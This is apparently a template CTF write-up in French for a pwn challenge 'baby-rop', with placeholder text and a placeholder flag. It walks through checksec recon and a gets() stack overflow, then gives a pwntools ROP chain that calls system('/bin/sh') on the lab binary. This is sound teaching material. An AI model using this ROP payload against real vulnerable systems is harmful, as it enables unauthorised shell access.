---
title: "baby-rop"
ctf: "HackTheBox Cyber Apocalypse 2026"
category: "pwn"
difficulty: "easy"
date: 2026-03-16
tags: ["rop", "x86_64", "pwntools", "stack-overflow"]
---

## Résumé

> Remplacez ce writeup d'exemple par votre propre contenu. Structure suggérée :
> contexte du challenge, reconnaissance, vulnérabilité identifiée, exploitation,
> et flag.

Un binaire ELF 64 bits non-PIE avec la protection NX activée est fourni. Le
programme lit une entrée utilisateur dans un buffer de taille fixe sur la pile,
sans vérification de longueur.

## Reconnaissance

```bash
file baby-rop
checksec --file=baby-rop
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

Absence de canari et binaire non-PIE : un enchaînement ROP classique est
envisageable pour contourner NX.

## Vulnérabilité

La fonction `vuln()` copie l'entrée utilisateur dans un buffer de 64 octets
avec `gets()`, sans limite de taille — un débordement de pile classique.

```c
void vuln() {
    char buf[64];
    gets(buf);
}
```

## Exploitation

Le binaire embarque un gadget `pop rdi ; ret` ainsi qu'un appel à `system()`
et une chaîne `"/bin/sh"` dans son binaire, ce qui permet de construire une
chaîne ROP directe :

```python
from pwn import *

elf = context.binary = ELF("./baby-rop")
io = process(elf.path)

pop_rdi = 0x0000000000401263
bin_sh  = 0x0000000000402008

payload  = b"A" * 72
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(elf.symbols["system"])

io.sendlineafter(b"> ", payload)
io.interactive()
```

## Flag

```
HTB{exemple_de_flag_a_remplacer}
```

## Points clés à retenir

- Toujours vérifier les protections du binaire avant de choisir une stratégie.
- L'absence de canari simplifie fortement le calcul de l'offset.
- `ropper` ou `ROPgadget` permettent d'identifier rapidement les gadgets utiles.
